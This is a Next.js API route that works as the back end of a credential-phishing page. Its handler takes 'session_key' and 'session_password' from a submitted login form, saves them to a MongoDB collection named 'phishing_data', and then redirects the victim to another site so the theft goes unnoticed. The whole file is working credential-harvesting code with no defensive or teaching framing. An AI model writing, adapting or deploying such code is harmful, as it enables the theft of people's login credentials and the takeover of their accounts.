import clientPromise from "@/mongodb";
import { NextRequest, NextResponse } from "next/server";

export async function POST(req) {
  const client = await clientPromise;
  const db = client.db("phishing_data");
  const data = await req.formData();
  const key = data.get("session_key");
  const pass = data.get("session_password");
  const res = await db.collection("phishing_data").insertOne({ key, pass });
  return NextResponse.redirect(process.env.REDIRECT_URI, { status: 302 });
}
